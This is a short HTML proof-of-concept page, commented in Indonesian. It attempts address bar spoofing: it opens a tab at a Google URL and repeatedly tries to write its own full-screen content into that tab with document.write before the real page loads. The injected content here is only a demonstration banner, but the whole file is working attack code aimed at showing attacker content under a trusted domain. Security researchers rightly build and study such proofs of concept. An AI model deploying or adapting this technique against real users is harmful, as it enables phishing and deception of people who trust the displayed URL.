<!DOCTYPE html>
<html>
<body>
<button onclick="a()">Click me</button>

<script>
function a() {
  // Step 1 - Buka google.com/csi langsung
  const tab = window.open(
    "https://www.google.com/csi", "_blank"
  );
  
  if (!tab) { alert("Blocked!"); return; }

  // Step 2 - Inject SANGAT cepat
  // sebelum google.com selesai load
  const tryInject = (attempt) => {
    try {
      // Coba tulis ke tab
      tab.document.write(`
        <div style="
          position:fixed;
          inset:0;
          background:#000;
          display:flex;
          flex-direction:column;
          justify-content:center;
          align-items:center;
          font-family:Arial,sans-serif;
        ">
          <img
            src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
            style="width:400px;max-width:90vw;"
          >
          <div style="
            margin-top:20px;
            color:#fff;
            font-size:48px;
            font-weight:900;
            letter-spacing:4px;
            text-shadow:0 0 10px #fff;
          ">
            Address Bar Spoofing
          </div>
        </div>
      `);
      tab.document.close();
      console.log('Success at attempt:', attempt);
    } catch(e) {
      console.warn('Attempt', attempt, ':', e.message);
      // Coba lagi kalau gagal
      if (attempt < 20) {
        setTimeout(() => tryInject(attempt + 1), 50);
      }
    }
  };

  // Mulai coba dari 0ms
  tryInject(0);
}
</script>
</body>
</html>
